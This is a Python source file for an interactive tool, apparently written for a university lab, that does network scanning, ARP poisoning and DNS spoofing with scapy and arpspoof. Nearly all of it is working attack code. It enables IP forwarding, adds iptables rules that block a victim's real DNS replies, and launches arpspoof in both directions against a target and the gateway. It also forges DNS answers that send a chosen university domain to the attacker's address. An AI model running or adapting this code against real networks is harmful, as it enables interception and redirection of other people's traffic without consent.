from scapy.all import *
import socket
import subprocess

import os

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
commands = [
    "iptables -A FORWARD -s 8.8.8.8 -p udp --sport 53 -d 192.168.0.4 -j DROP",
    "iptables -A FORWARD -s 8.8.8.8 -p tcp --sport 53 -d 192.168.0.4 -j DROP"
]

# Run each command
for cmd in commands:

    try:
        subprocess.run(cmd.split(), check=True)
        print(f"Executed: {cmd}")
    except subprocess.CalledProcessError as e:
        print(f"Failed to run: {cmd}\nError: {e}")
        
        
attacker_ip = "192.168.0.254"
upstream_dns = "8.8.8.8"
upstream_port = 53
spoof_domain = "xsite.singaporetech.edu"
domain_ip = "192.168.0.254"
gateway_ip = "192.168.0.1"
Ip_binding_table = {}
Intface = "eth0"  # Change to your network interface
target_mac = None
target_ip = None

'''Testing purposes'''
Ip_binding_table["DC:97:BA:17:82:B6"] = "192.168.0.116-0"

def get_local_ip():
    try:
        # Connect to an external IP (Google DNS) without sending data
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except Exception as e:
        return f"Error: {e}"

def print_bindings():
    """
    Print the current DHCP bindings in a neat table.
    """
    if not Ip_binding_table:
        print("No DHCP bindings found.\n")
        return

    print("\n{:<4} {:<20} {:<15}".format("No.", "MAC Address", "IP Address"))
    print("-" * 43)
    for idx, (mac, ip) in enumerate(Ip_binding_table.items(), 1):
        print("{:<4} {:<20} {:<15}".format(idx, mac, ip))
    print("-" * 43 + "\n")

def print_help():   
    print("DHCP injector:")
    print("S - Map TCP connections of other devices")
    print("A - send ARP poisoning attack to addresses in table")
    print("SN - Start DNS spoofing on UDP port 53")
    print("Q - Quit the program")


def get_mac_from_ip(ip, bindings):
    for mac, bound_ip in bindings.items():
        if bound_ip == ip:
            return mac
    return None  # not found

def tcp_arp_scan_dynamic():
    """
    Perform a TCP ARP scan on the /24 subnet of the current local IP.
    """
    local_ip = get_local_ip()
    print(f"Scanning for devices on local network: {local_ip} with subnet /24")
    base_ip_parts = local_ip.split(".")[:3]  # e.g., ['192', '168', '0']

    for i in range(1, 10):
        #Step 1: ARP to get MAC address
        target_ip = f"{base_ip_parts[0]}.{base_ip_parts[1]}.{base_ip_parts[2]}.{i}"
        interface = Intface

        arp_request = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp_request

        ans, _ = srp(packet, timeout=.2, iface=interface, verbose=False)

        if ans:
            target_mac = ans[0][1].hwsrc
            print(f"[+] MAC Address of {target_ip} is {target_mac}")
            Ip_binding_table[target_mac] = target_ip  # Store IP and MAC
        else:
            print(f"[-] No ARP reply received. Host may be offline.")
            continue

        # Step 2: TCP SYN to check for online presence
        ip = IP(dst=target_ip)
        tcp = TCP(dport=80, flags="S")  # SYN to port 80

        response = sr1(ip/tcp, timeout=.5, iface=interface, verbose=False)

        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            print(f"[+] Host {target_ip} is online. Received SYN-ACK.")
            # Send RST to close the half-open connection
            rst = TCP(dport=80, sport=response.sport, flags="R", seq=response.ack, ack=response.seq + 1)
            send_rst = ip / rst
            sr1(send_rst, timeout=1, verbose=False)
        else:
            print(f"[-] No SYN-ACK. Host may be down or port is closed.")


def forward_to_upstream(pkt):
    '''Forward the DNS query to the upstream DNS server and return the response.
    '''
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(2)  # Set a timeout for the socket
    try:
        sock.sendto(pkt, (upstream_dns, upstream_port))
        response, _ = sock.recvfrom(4096)  # Buffer size of 4096 bytes
       # print(response)
        return response
    except socket.timeout:
        print("[!] Upstream DNS server did not respond in time.")
        return None
    except Exception as e:
        print(f"[!] Error communicating with upstream DNS: {e}")
        return None
    finally:
        sock.close()
    
def dns_spoof(pkt):
    '''Handle DNS pacgateway_ipkets and spoof responses for a specific domain.
    if DNS does not exist, forward the request to the upstream DNS server.'''
    if pkt[Ether].dst != get_if_hwaddr(Intface) and pkt[Ether].dst != "ff:ff:ff:ff:ff:ff":
        return
    if DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].qr == 0:
        qname = pkt[DNSQR].qname.decode().strip('.')
        # if pkt[IP].src is not target_ip:
        #     return
        print(f"[+] DNS Query for: {qname}")
        print(f"Checking for {str(spoof_domain)} against {str(qname)}")
        if str(spoof_domain) in str(qname):
            print(f"[!] Intercepted {spoof_domain}, sending custom response.")
            ether = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(Intface))
            ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
            udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
            dns_layer = DNS(
                id=pkt[DNS].id,
                qr=1,
                aa=1,
                qd=pkt[DNS].qd,
                an=DNSRR(rrname=pkt[DNSQR].qname.decode(), ttl=300, rdata=domain_ip)
            )
            response = ether / ip_layer / udp_layer / dns_layer
            response.show2()
            sendp(response, verbose=1)
        else:
            ''''''
            #Forward the packet to upstream and relay the response
            print(f"[+] Forwarding DNS query for {qname}")
            raw_pkt = bytes(pkt[UDP].payload)
            try:
                print(f"[+] Forwarding DNS query for {qname} to upstream DNS server. Original src: {pkt[IP].src}, dst: {pkt[IP].dst}")
                # Forward the DNS query to the upstream DNS server
                upstream_response = forward_to_upstream(raw_pkt)
                parsed = DNS(upstream_response)
                a_answers = []
                for i in range(parsed.ancount):
                    rr = parsed.an[i]
                    if rr.type == 1:  # A record
                        a_answers.append(rr)

                if not a_answers:
                    print("[!] No A records in upstream response. Dropping packet.")
                    return
                
                ether = Ether(dst=pkt[Ether].src, src=get_if_hwaddr(Intface))
                ip_layer = IP(dst=pkt[IP].src, src=pkt[IP].dst)
                udp_layer = UDP(dport=pkt[UDP].sport, sport=53)
                dns_resp = DNS(upstream_response)
                response = ether / ip_layer / udp_layer / dns_resp
                #response.show2()
                print(f"[+] Sending upstream DNS response to {pkt[IP].dst} from {pkt[IP].src}")
                sendp(response, verbose=0)
            except Exception as e:
                print(f"[!] Error forwarding DNS: {e}")



def main():
    global Ip_binding_table, target_mac, target_ip
    print("ARP Thingy - ARP Poisoning and DNS Spoofing Tool")
    print("Press 'H' for help.")
    
    while True:
        choice = input("Enter your choice: ").strip().upper()
        
        if choice == 'S':
            tcp_arp_scan_dynamic()
        elif choice == 'A':
            ''' get first arg after 'A' as target IP.'''
            target_ip = input("Enter target IP for ARP poisoning: ").strip()
            if target_ip in Ip_binding_table.values():
                target_mac = get_mac_from_ip(target_ip, Ip_binding_table)
                print("[+] Target MAC Address changed to: ", target_mac)
                input("Press Enter to start attack...")
                ''' At this part, we will use the kali arping command to send ARP poison to the target IP. We will do it by opening another terminal and running the command.'''
                print(f"[.] Sending ARP poison to {target_ip} ({target_mac})")
                subprocess.Popen([
                    "gnome-terminal", "--", "bash", "-c",
                    f"arpspoof -i {Intface} -t {target_ip} {gateway_ip}; exec bash"
                ])

                subprocess.Popen([
                    "gnome-terminal", "--", "bash", "-c",
                    f"arpspoof -i {Intface} -t {gateway_ip} {target_ip}; exec bash"
                ])
                print(f"[!] ARP poison sent to {target_ip} ({target_mac}). Check subprocess output for details.") 
               
            else:
                print(f"{target_ip} is not in the bindings.")
        elif choice == 'Q':
            print("Exiting the program.")
            break
        elif choice == 'T':
            target_ip = input("Enter target IP for ARP poisoning: ").strip()
            if target_ip in Ip_binding_table.values():
                target_mac = get_mac_from_ip(target_ip, Ip_binding_table)
                print("[+] Target MAC Address changed to: ", target_mac)
            else:
                print(f"{target_ip} is not in the bindings.")
        elif choice == 'SN':
            print("[*] Starting DNS spoofing on UDP port 53...")
            sniff(filter="udp dst port 53", prn=dns_spoof, iface=Intface, store=0)
        elif choice == 'H':
            print_help()
        elif choice == 'P':
            print_bindings()
        else:
            print("Invalid choice. Press H for help\n")

if __name__ == "__main__":
    main()
    
